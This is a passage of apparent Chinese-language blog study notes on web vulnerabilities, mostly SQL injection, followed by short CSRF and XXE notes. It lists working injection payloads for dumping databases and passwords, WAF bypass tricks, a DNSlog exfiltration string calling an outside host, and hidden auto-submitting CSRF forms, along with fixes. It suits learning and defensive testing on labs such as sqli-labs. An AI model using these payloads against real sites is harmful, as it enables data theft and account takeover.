concat(username,0x7e,password) from security.users limit N,1),0x7e))--+</code> ：爆值</li></ul><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateXML(xml_target, xpath_expr, new_xml)</span><br></pre></td></tr></table></figure><p>​用 new_xml 替换根据 xpath_expr 在 xml_target 匹配到的内容，然后返回更改后的 XML 。如果 xpath_expr 未找到匹配的表达式，或者找到多个匹配项，该函数将返回原始 xml_target 。</p><p>​所有三个参数都应该是字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">UpdateXML(&#x27;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&#x27;, &#x27;/a&#x27;, &#x27;&lt;e&gt;fff&lt;/e&gt;&#x27;) AS val1,</span><br><span class="line">UpdateXML(&#x27;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&#x27;, &#x27;/b&#x27;, &#x27;&lt;e&gt;fff&lt;/e&gt;&#x27;) AS val2,</span><br><span class="line">UpdateXML(&#x27;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&#x27;, &#x27;//b&#x27;, &#x27;&lt;e&gt;fff&lt;/e&gt;&#x27;) AS val3,</span><br><span class="line">UpdateXML(&#x27;&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&#x27;, &#x27;/a/d&#x27;, &#x27;&lt;e&gt;fff&lt;/e&gt;&#x27;) AS val4,</span><br><span class="line">UpdateXML(&#x27;&lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;&#x27;, &#x27;/a/d&#x27;, &#x27;&lt;e&gt;fff&lt;/e&gt; &#x27;) AS val5</span><br><span class="line"></span><br><span class="line">val1: &lt;e&gt;fff&lt;/e&gt;</span><br><span class="line">val2: &lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br><span class="line">val3: &lt;a&gt;&lt;e&gt;fff&lt;/e&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br><span class="line">val4: &lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;e&gt;fff&lt;/e&gt;&lt;/a&gt;</span><br><span class="line">val5: &lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>​updatexml 使用时，当 xpath 格式出现错误，MySQL 会爆出 xpath 语法错误。</p><p>​注入命令类似 extractvalue() ，多加个参数值 1 就是了。</p><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>​<code>select count(*), floor(rand(0)*2) x from xxx group by x;</code> 。</p><p>​rand(0) 将产生 0<del>1 的随机数，rand(0)*2 将产生 0</del>2 的随机数，floor(rand(0)*2) 将得到 0 或 1 。floor() 报错注入的本质是 group by 语句的报错，group by 语句报错的原因是 floor(rand(0)*2) 的不确定性，即可能为 0 或 1 。</p><p>​group by key 执行时，将依次读取数据表的每一行，将结果保存于临时表中。读取每一行的 key 时，如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算rand值）；如果 key 不存在于临时表中，则在临时表中插入 key 所在行的数据（插入数据时，会再计算rand 值）。例如，临时表只有 key 为 1 的行不存在 key 为 0 的行，那么数据库要将该条记录插入临时表，由于是随机数，插时要计算一下随机值，此时 floor(rand(0)*2) 的结果可能为 1，就会导致插入时冲突而报错。</p><ul><li><code>?id=1&#39; union select 1,count(*),concat((select database()),0x7e,floor(rand(0)*2)) a from information_schema.schemata group by a--+</code>：爆库名</li><li><code>?id=1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&#39;xxx&#39; limit N,1),0x7e,floor(rand(0)*2)) a from information_schema.columns group by a--+</code>：爆表名</li><li><code>?id=1&#39; union select 1,count(*),concat((select column_name from information_schema.columns where table_schema=&#39;xxx&#39; and table_name=&#39;xxx&#39; limit N,1),0x7e,floor(rand(0)*2)) a from information_schema.columns group by a--+</code>：爆列名</li><li><code>?id=1&#39; union select 1,count(*),concat((select password from security.users limit N,1),0x7e,floor(rand(0)*2)) a from information_schema.columns group by a--+</code>：爆值</li></ul><h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><p>​前提：MySQL 版本 5.5~5.5.49，此时数据超出 DOUBLE 才会报错，同时会返回查询信息，而不是像这样：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/13.png"></p><p>​前置知识：</p><ul><li>exp(x)：返回 e 的 x 次方计算结果</li><li>如果一个查询成功执行，则其返回值为 0</li><li>~0 将得到 18 446 744 073 709 551 615 ，无符号 BIGINT 范围 <code>(0, 18 446 744 073 709 551 615)</code> 。</li></ul><p>​所以构造 payload 如 <code>?id=1&#39; and exp(~(select * from (select database())x))--+</code></p><h3 id="查询重复"><a href="#查询重复" class="headerlink" title="查询重复"></a>查询重复</h3><p>​<code>?id=1&#39; union select 1,2,3 from (select name_const(version(),1),name_const(version(),1)) x --+</code></p><p>​<code>SELECT NAME_CONST(&#39;My Name&#39;, 7);</code> 相当于 <code>SELECT 7 AS &#39;My Name&#39;;</code> ，规定前一个参数值为列名字符串，后一个值为常量。</p><h2 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h2><h3 id="id-1’-and-left-version-1-N–"><a href="#id-1’-and-left-version-1-N–" class="headerlink" title="?id&#x3D;1’ and left(@@version,1)&#x3D;N–+"></a>?id&#x3D;1’ and left(@@version,1)&#x3D;N–+</h3><p>​猜数据库版本。</p><h3 id="id-1’-and-length-database-N–"><a href="#id-1’-and-length-database-N–" class="headerlink" title="?id&#x3D;1’ and length(database())&#x3D;N–+"></a>?id&#x3D;1’ and length(database())&#x3D;N–+</h3><p>​猜库名长度。</p><h3 id="id-1’-and-left-database-1-’a’–-、-id-1’-and-left-database-2-’sa’–"><a href="#id-1’-and-left-database-1-’a’–-、-id-1’-and-left-database-2-’sa’–" class="headerlink" title="?id&#x3D;1’ and left(database(),1)&gt;’a’–+、?id&#x3D;1’ and left(database(),2)&gt;’sa’–+"></a>?id&#x3D;1’ and left(database(),1)&gt;’a’–+、?id&#x3D;1’ and left(database(),2)&gt;’sa’–+</h3><p>​猜库名。</p><h3 id="id-1’-and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-M-1-N-1-101"><a href="#id-1’-and-ascii-substr-select-table-name-from-information-schema-tables-where-table-schema-database-limit-M-1-N-1-101" class="headerlink" title="?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit M,1),N,1))&#x3D;101"></a>?id&#x3D;1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit M,1),N,1))&#x3D;101</h3><p>​猜表名。</p><h3 id="id-1’-and-1-select-1-from-information-schema-columns-where-table-schema-’xxx’-and-table-name-regexp-‘xxx’-limit-N-1-–"><a href="#id-1’-and-1-select-1-from-information-schema-columns-where-table-schema-’xxx’-and-table-name-regexp-‘xxx’-limit-N-1-–" class="headerlink" title="?id&#x3D;1’ and 1&#x3D;(select 1 from information_schema.columns where table_schema&#x3D;’xxx’ and table_name regexp ‘xxx’ limit N,1)–+"></a>?id&#x3D;1’ and 1&#x3D;(select 1 from information_schema.columns where table_schema&#x3D;’xxx’ and table_name regexp ‘xxx’ limit N,1)–+</h3><p>​猜表名，正则匹配。</p><h3 id="id-1’-and-ord-mid-select-ifnull-cast-username-as-char-0x20-from-security-users-order-by-id-limit-M-1-N-1-68–"><a href="#id-1’-and-ord-mid-select-ifnull-cast-username-as-char-0x20-from-security-users-order-by-id-limit-M-1-N-1-68–" class="headerlink" title="?id&#x3D;1’ and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit M,1),N,1))&#x3D;68–+"></a>?id&#x3D;1’ and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit M,1),N,1))&#x3D;68–+</h3><p>​猜值。</p><h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>​利用 sleep()、benchmark() 等函数让 MySQL 的执行时间变长，多与 if(expr1,expr2,expr3) 结合使用。</p><blockquote><p>benchmark() 函数，用于测试 MySQL 对指定操作的执行速度。 </p><p><code>benchmark(count,expr)</code></p><p>重复计算 expr 表达式 count 次，通过这种方式就可以评估出 MySQL 执行这个表达式的效率。这个函数的返回值始终是 0 。</p><p>效率参考的地方： <code>1 row in set (4.74 sec)</code> ，MySQL 提示的执行时间。</p></blockquote><p>​<a href="https://blog.csdn.net/m0_51330619/article/details/120392450">延时注入中的benchmark</a></p><p>​将 expr2 设置为 sleep() 等函数，如果 expr1 为 true，则浏览器转 sleep() 里的秒数后再回显，否则直接回显。所用到的猜解语句同布尔注入类似，不多演示，仅展示一例：</p><p>​<code>?id=1&#39; and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+</code> ：猜库名。</p><h2 id="导出文件"><a href="#导出文件" class="headerlink" title="导出文件"></a>导出文件</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><p>​MySQL <code>SELECT ... INTO OUTFILE &quot;file&quot;</code> ，将结果写入文件：</p><ul><li>该文件不能事先就存在</li><li>数据库用户需拥有 FILE 权限</li><li>文件路径要与 secure_file_priv 的设置不冲突</li></ul><p>​MySQL 默认不能导入和导出文件，这与 secure_file_priv 的值有关（默认为null）。secure_file_priv 参数是用来限制 LOAD DATA、SELECT … INTO OUTFILE、LOAD_FILE() 的文件到哪个指定目录的。</p><ul><li>当 secure_file_priv 的值为 null ，表示不允许导入、导出</li><li>当 secure_file_priv 的值为如 &#x2F;tmp&#x2F; ，表示导入、导出只能发生在 &#x2F;tmp&#x2F; 目录下</li><li>当 secure_file_priv 的值为空，表示不对导入、导出做限制</li></ul><p>​使用 <code>show variables like &#39;secure_file_priv&#39;</code> 命令来查看 secure_file_priv 设置。</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><ol><li>获取 secure_file_priv 的值。</li><li>如果 secure_file_priv 设置为空，则可以写入到网址根目录的文件里，从而通过 url 访问来查看写入内容或写入木马连接蚁剑。否则，只能按照 secure_file_priv 的设置写文件，并在其指定目录下查看。</li><li>获取字段数：<code>?id=1&#39;)) order by 3--+</code> 。</li><li>依次获取库名、表名、列名、值，类似普通注入，只是改成 <code>SELECT ... INTO OUTFILE &quot;file&quot;</code> 而已。</li></ol><h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><h3 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h3><p>​UNC 路径是一种用于在计算机网络中标识资源位置的标准命名格式。UNC 路径通常用于访问共享文件夹或打印机等网络资源。</p><p>​UNC路径的一般格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\&lt;计算机名称&gt;\&lt;共享资源名称&gt;\&lt;子目录&gt;\...</span><br></pre></td></tr></table></figure><ul><li><code>&lt;计算机名称&gt;</code> 是共享资源所在的计算机的名称或网络地址。</li><li><code>&lt;共享资源名称&gt;</code> 是共享文件夹或打印机的名称。</li><li><code>&lt;子目录&gt;</code> 是共享资源下的子文件夹名称，可以有多级子目录。</li></ul><p>​例如，假设有一个名为 “Server” 的计算机共享了一个名为 “SharedFolder” 的文件夹，其中包含一个名为 “Documents” 的子文件夹。UNC 路径可以表示为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\Server\SharedFolder\Documents</span><br></pre></td></tr></table></figure><p>​UNC 路径的好处是它可以在网络中唯一地标识资源的位置，而不依赖于驱动器号或具体的物理路径。这使得在访问网络资源时，不受驱动器映射和物理路径变化的影响，提供了更好的可移植性和灵活性。</p><h3 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h3><p>​DNSlog 注入的核心就是使用 load_file() 函数读取攻击者设置的站点上的文件，SQL 语句执行时把查询内容拼接到 url 上，进行数据外带，一般用于盲注。</p><p>​payload：<code>?id=1&#39; union select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.tvekqu.dnslog.cn/a.txt&#39;)--+</code> 。</p><p>​a.txt 存不存在不重要，但一定要加上一个文件路径。</p><p>​四个 <code>\</code> 是因为进行了转义。</p><p>​<strong>补充说明</strong>：可以用 load_file() 来读取被攻击站点上的文件。</p><ol><li>需要先获取 secure_file_priv 的值，查看 load_file() 函数可操作的范围。</li><li>欲读取文件必须小于 <code>max_allowed_packet</code> ，可使用 <code>show global variables like &#39;max_allowed_packet&#39;;</code> 查看。</li><li>如果欲读文件不存在，或权限等原因而不能被读出，函数将返回 NULL 。</li></ol><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>​二次注入就是将可能导致 SQL 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 SQL 注入。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>​sqli-labs Less-24</p><p>​初始存在账密 admin 1：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/6.png"></p><p>​我们的目的是将 admin 账户的密码改为 hacker 。</p><p>​首先注册账户 admin’# hack：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/7.png"></p><p>​之后登录 admin’# 账户，修改其密码为 hacker ，那么执行的 SQL 语句将为 <code>update xxx set password=&#39;hacher&#39; where username=&#39;admin&#39;#&#39;</code> ，即实际修改的是账户 admin 的密码：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/8.png"></p><p>​可以发现账户 admin 的密码已修改为 hacker 。</p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>​堆叠注入，就是一次执行多条 SQL 语句。</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/10.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `student` WHERE STUDENTID=&#x27;2101010101&#x27;;</span><br><span class="line">DELETE FROM `student` WHERE STUDENTID=&#x27;2102020202&#x27;;</span><br></pre></td></tr></table></figure><p>​多条 SQL 语句一起执行时只显示第一条的结果，但所有的都会执行：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/12.png"></p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/11.png"></p><p>​堆叠注入跟联合注入很像，但联合注入只能 union select ，而堆叠注入 select、update、delete、insert 都可以，操作空间更大。</p><p>​堆叠注入一般用于插入或修改账密。</p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="过滤–-、"><a href="#过滤–-、" class="headerlink" title="过滤–+、#"></a>过滤–+、#</h2><p>​例如闭合方式为 ‘$id’ ，则 <code>?id=-1&#39; union select 1,database(),&#39;2</code> 。</p><h2 id="过滤and、or"><a href="#过滤and、or" class="headerlink" title="过滤and、or"></a>过滤and、or</h2><ul><li>大小写变形</li><li>利用运算符替换：or → ||、and → &amp;&amp;</li></ul><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><ul><li>%09 TAB键（水平）</li><li>%20 空格</li><li>%a0 空白</li><li>%0a 换行符</li><li>%0b TAB键（垂直）</li><li>%0c 新的一页</li><li>%0d return功能</li><li>&#x2F;**&#x2F;</li><li>&#x2F;!&#x2F;</li></ul><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><p>​转为进制，如 16 进制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;users&#x27;</span><br><span class="line">==&gt;</span><br><span class="line">select * from users where username=0x7573657273</span><br></pre></td></tr></table></figure><h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><ul><li><p>对于substr()、mid() 可以用 from to 代替：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line"></span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure></li><li><p>使用 join 代替：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2--+</span><br><span class="line">&lt;==&gt;</span><br><span class="line">union select * from (select 1)a join (select 2)b--+</span><br></pre></td></tr></table></figure></li><li><p>使用 like 代替：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80--+</span><br><span class="line">&lt;==&gt;</span><br><span class="line">select user() like &#x27;r%&#x27;--+</span><br></pre></td></tr></table></figure></li><li><p>对于 limit 可以使用 offset 来绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1--+</span><br><span class="line">&lt;==&gt;</span><br><span class="line">select * from news limit 1 offset 0--+</span><br></pre></td></tr></table></figure></li></ul><h2 id="过滤比较符号"><a href="#过滤比较符号" class="headerlink" title="过滤比较符号"></a>过滤比较符号</h2><p>​使用 greatest()、least() 绕过，前者返回最大值，后者返回最小值。</p><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤&#x3D;"></a>过滤&#x3D;</h2><p>​使用 like 、rlike（regexp的同义词） 、regexp 绕过。</p><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul><li>URL编码：# → %23</li><li>Hex编码：~ → 0x7e</li></ul><h2 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h2><p>​HTTP Parameter Pollution ，HTTP 参数污染。注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入，即 <code>?id=1&amp;id=xxx</code> 。示例：sqli-labs Less-29 。</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>​首先我们来了解以下 url 编码的规则：url 编码就是 % 加一个字符 ASCII 码的十六进制。</p><p>​其次：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/9.png"></p><p>​以 sqli-labs Less-32 为例，我们发现输入 ?id&#x3D;1’ 时，后端将处理成 1\‘ ，即添加转义字符将注入点转义防止 SQL 注入。在一般情况下，此处是不存在 SQL 注入漏洞的，但当 MySQL 为 GBK 编码时，可以使用宽字节注入。</p><p>​宽字节编码是指不是像 ASCII 一样一个字符只占一个字节，如在 GBK 中一个汉字占两个字节。宽字节注入是利用 MySQL 的一个特性，即 MySQL 在使用 GBK 编码时，会认为两个字符是一个汉字（但需要前一个字符的ASCII码要大于127，才到汉字的范围）。</p><p>​GET 型宽字节注入的格式是在输入内容后加一个 %df，即如 <code>?id=1%df&#39;</code> ，到达 SQL 语句中时处理为 id&#x3D;1�\‘ （因为ASCII中不存在16进制为df的字符，所以暂时转换为� ）。当 GBK 编码的 MySQL 识别  id&#x3D;1�\‘ 时，因为 �（即16进制数df）大于 127 ，将被识别为汉字的第一个字节，而 \ 的 ASCII 码的 16 进制为 5c ，df5c 在 GBK 编码中是繁体字“運”，这样注入信息最终变成 id&#x3D;1運’ ，转义符号 \ 被吞噬，单引号成功逃逸。</p><p>​POST 型宽字节注入则需要抓包自己加上 16 进制为 df 的”字符“。</p><h2 id="静态资源请求"><a href="#静态资源请求" class="headerlink" title="静态资源请求"></a>静态资源请求</h2><p>​特定的静态资源后缀请求。类似白名单机制，waf 为了提高检测效率，会直接放弃检测这样一些静态文件名后缀的请求。</p><p>​常见的静态文件：.js、.jpg、.swf、.css 等。</p><p>​注：aspx&#x2F;php 只识别到前面的 .aspx&#x2F;.php，后面的基本不识别。</p><p>​<img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/15.png"></p><h2 id="URL白名单"><a href="#URL白名单" class="headerlink" title="URL白名单"></a>URL白名单</h2><p>​为防止误拦，部分 waf 内置默认的白名单列表，如 admin.php、&#x2F;admin&#x2F;、&#x2F;system&#x2F;、&#x2F;manager&#x2F; 及相关组合，用于后台管理等。只要 url 中存在白名单字符串，就不会对其进行检测。如：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/SQL%E6%B3%A8%E5%85%A5/16.png"></p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ol><li>针对客户端传入的内容，过滤一些 SQL 关键字，比如 select 、insert ，以及反引号 、引号、– 这一类保留字符。当然因为各种编码和绕过技术，手工进行过滤是不够的，容易遗漏，比较安全的方式是采用编程语言预置的功能，例如，用 Java 的 PreparedStatment 进行 SQL 操作。当然，现在还有很多框架类的数据操作工具，如常见的数据库持久化框架，都会自动完成对相关数据的过滤和校验。</li><li>不要使用字符串拼接的方式进行 SQL 语句的组装和操作。 </li><li>不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</li><li>不要把机密信息直接存放，先加密处理。</li><li>应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装。</li><li>对传入的特殊字符进行转义。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;h2 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CSRF漏洞学习</title>
    <link href="http://example.com/2024/02/25/CSRF/"/>
    <id>http://example.com/2024/02/25/CSRF/</id>
    <published>2024-02-24T16:00:00.000Z</published>
    <updated>2024-02-25T12:18:36.727Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​CSRF（Cross-Site Request Forgery），跨站请求伪造。看起来与 XSS 很像，但 XSS 是获取网站受信任用户的信息进行攻击，而 CSRF 并没有获取用户的身份信息，只是通过伪装成用户进行攻击。CSRF 攻击流程示例：</p><ul><li><p>受害者登录 a.com，并保留了登录凭证 Cookie</p></li><li><p>攻击者引诱受害者访问了 b.com</p></li><li><p>b.com 向 a.com 发送了一个请求：a.com&#x2F;act&#x3D;xxx，浏览器会默认携带 a.com 的 Cookie</p></li><li><p>a.com 接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求</p></li><li><p>a.com 以受害者的名义执行了 act&#x3D;xx</p></li><li><p>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 a.com 执行了攻击者想要的操作</p></li></ul><p>​注意，edge 浏览器限制了不同源网站不能传递 Cookie ，但 IE 没有这个问题。</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h2><p>​类似 XSS：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://example.com/act=xxx&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>/&gt;</span></span><br><span class="line">//一般像这种在<span class="tag">&lt;<span class="name">body</span>&gt;</span>里的，且利用src属性的元素，加上style=&quot;display:none;&quot;会更好</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;…&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;…&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;…&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;…&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;…&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;…&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">...</span></span></span><br></pre></td></tr></table></figure><p>​有些情况下（如鼠标悬浮在链接上，或者用户查看了网页源代码），攻击者构造的 URL 会把攻击意图暴露给用户，这种情况可以用短网址进行伪装。</p><h2 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://example.com/act=xxx&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;xxx&quot;</span> <span class="attr">value</span>=<span class="string">&quot;xxx&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> //这行代码加不加都行，加了就是一个自动提交</span><br></pre></td></tr></table></figure><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ol><li>二次确认，使用验证码或需要重新输入密码。比如转账时要求用户重新输入密码，进行删除操作时要求用户输入验证码。这个方法可以完全解决 CSRF ，但是出于用户体验考虑，网站不能给所有的操作都加上二次确认。因此该方法只能作为一种辅助手段，不能作为主要解决方案。</li><li>验证 HTTP Referer 字段，该字段记录了此次 HTTP 请求的来源地址。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;​		CSRF（Cross-Site Request Forgery），跨站请求伪造。看起来与 XSS 很像，但 XSS 是获取网站受信任用</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞学习</title>
    <link href="http://example.com/2024/02/25/XXE/"/>
    <id>http://example.com/2024/02/25/XXE/</id>
    <published>2024-02-24T16:00:00.000Z</published>
    <updated>2024-02-25T12:22:18.893Z</updated>
    
    <content type="html"><![CDATA[<p>​一篇足矣：<a href="https://xz.aliyun.com/t/3357#toc-0">一篇文章带你深入理解漏洞之 XXE 漏洞</a>。</p><p>​从 “四、我们能做什么” 开始看。</p><p>​关于漏洞检测，可以手动更改 Content-Type 并传入 XML 数据，如果它接受了，那么可以进一步测试有没有 XXE 。</p>]]></content>
    
    
      
      
